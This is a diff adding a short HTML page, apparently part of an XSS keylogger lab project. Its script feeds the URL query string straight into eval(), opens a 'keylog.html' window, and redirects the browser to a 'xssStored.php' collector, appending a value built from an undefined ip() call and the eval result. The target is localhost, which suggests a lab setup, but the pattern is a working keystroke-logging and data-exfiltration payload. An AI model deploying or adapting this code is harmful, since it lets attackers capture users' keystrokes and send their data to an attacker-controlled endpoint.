@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>test1</title>
+</head>
+<body>
+	<script>
+	  var url=document.URL;
+	  var tt=url.substring(url.indexOf("?")+1,url.length);
+	  window.open('http://localhost:8081/XSS_keyboard/src/keylog.html','resizable=no width=600 height=500');
+	  document.location='http://localhost:8081/XSS_keyboard/src/xssStored.php?a='+ip()+':- '+eval(tt);
+	  </script>
+</body>
+</html>
+
